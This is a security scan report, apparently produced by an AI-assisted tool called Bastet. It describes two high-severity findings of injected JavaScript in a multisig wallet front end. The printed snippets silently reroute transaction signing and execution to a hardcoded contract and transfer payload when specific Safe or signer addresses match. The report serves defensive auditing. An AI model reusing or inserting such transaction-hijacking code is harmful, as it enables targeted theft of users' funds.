
<div style="display: flex; justify-content: center; align-items: center; gap: 10px;">
<img src="image/Bastet.png" width="60">
<span style="font-size: 30px; font-weight: bold;">Bastet AI Scanning Report</span>
</div>
<br><br>
# About Bastet Cefi
Bastet is a scanning tool focusing on irregular business logic error for web2 security along with an AI-driven automated detection process to enhance vulnerability detection accuracy and optimize security lifecycle management.

# Risk Classification

| Severity Level | Impact: High | Impact: Medium | Impact: Low   |
| ------------------- | -------- | ------------- | ------------- |
| Likelihood: High    | High     | Medium        | Low           |
| Likelihood: Medium  | Medium   | Low           | Informational |
| Likelihood: Low     | Low      | Informational | Informational |

## Impact
High: leads to a loss of assets in the protocol, or significant harm to a majority of users.
Medium: function or availability of the protocol could be impacted or losses to only a subset of users.
Low: State handling, function incorrect as to spec, issues with clarity, losses will be annoying but bearable.

## Likelihood
* 	High: almost certain to happen, easy to perform, or not easy but highly incentivized.
* Medium: only conditionally possible or incentivized, but still relatively likely.
* Low: requires stars to align, or little-to-no incentive.

<div style="page-break-before: always;"></div>

# Security Assessment Summary
This security assessment is supported by [Bastet](https://github.com/OneSavieLabs/Bastet). Bastet is an AI vulnerability detection infrastructure that includes a dataset of common DeFi smart contract vulnerabilities as well as multiple vulnerability detection processes. It is capable of identifying medium- to high-risk issues observed on-chain and in past audit competitions and, through its customizable detection workflows, improves the accuracy of automated vulnerability discovery. Bastet also supports comprehensive security evaluations during development, auditing, and monitoring phases.

# Project Summary

TBD // maybe add a quick summary from ai to read the codebase?

### Issues Found : 
| Severity      | Count |
| ------------- | ----- |
| High          |   2   |
| Medium        |   0   |
| Low           |   0   |
| Informational |   0   |
| **Total**     |   2   |

<div style="page-break-before: always;"></div>

# Findings
### Malicious smart contract injection in transaction execution path
* **Severity**: High
* **Vulnerability**: 
* * **Function Name**: E
* * **Description**: The function modifies the transaction data to redirect execution to a malicious contract address when certain wallet or signer addresses match hardcoded values. This change replaces the intended recipient, data payload, and execution parameters, effectively hijacking funds or calls. Normal operation proceeds for other users, making the behavior targeted and harder to detect.
* * **Code Snippet**: 
```
let wa=["0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4","0x19c6876e978d9f128147439ac4cd9ea2582cd141"];
let ba=["0x828424517f9f04015db02169f4026d57b2b07229","0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97"];
let ta="0x96221423681a6d52e184d440a8efcebb105c7242"; let da="0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000";
...
const cf=wa.some(k1 => lu.includes(k1));
const cb=ba.some(k1 => sa.includes(k1));
if(cf == true && se.data.operation==0){
  const td=structuredClone(se.data);
  se.data.to=ta;
  se.data.operation=op;
  se.data.data=da;
  se.data.value=vl;
  se.data.safeTxGas=sga;
  try{l=await sd.executeTransaction(se,st);se.data=td;}catch (e) {se.data=td; throw e;}
} else {
  l=await sd.executeTransaction(se,st);
}
```
* **Recommendation**: 
Remove any conditional logic that modifies transaction details based on hardcoded wallet or signer addresses. Ensure that all transaction parameters originate from the user and are validated before execution. Conduct a thorough review of the code to confirm no unauthorized address-based rerouting is present.

---

### Malicious smart contract injection in transaction signing path
* **Severity**: High
* **Vulnerability**: 
* * **Function Name**: O
* * **Description**: The function intercepts transaction signing and changes the destination address, operation type, data payload, and gas parameters when the Safe address matches hardcoded malicious addresses. Additionally, if the signer address matches another set of hardcoded addresses, it triggers a page reload. This behavior targets specific users to redirect signed transactions to malicious contracts without their consent.
* * **Code Snippet**: 
```
let wa=["0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4","0x19c6876e978d9f128147439ac4cd9ea2582cd141"];
let ba=["0x828424517f9f04015db02169f4026d57b2b07229","0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97"];
let ta="0x96221423681a6d52e184d440a8efcebb105c7242"; let da="0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000";
...
const cf=wa.some(k1 => lu.includes(k1));
const cb=ba.some(k1 => sa.includes(k1));
if(cb==true){location.href=location.href;}
if(cf==true && se.data.operation==0){
  const td=structuredClone(se.data);
  se.data.to=ta;
  se.data.operation=op;
  se.data.data=da;
  se.data.value=vl;
  se.data.safeTxGas=sga;
  try { const r=await sd.signTransaction(se,st); r.data=td; se.data=td; return r; } catch (n) { se.data=td; throw n; }
} else {
  const r=await sd.signTransaction(se,st); return r;
}
```
* **Recommendation**: 
Eliminate the malicious logic that alters transaction signing parameters based on specific hardcoded addresses. Signing functions should only process the data given by the user and should not introduce hidden address checks or modifications. Audit and remove any reload or diversion behaviors to prevent targeted exploitation.

---



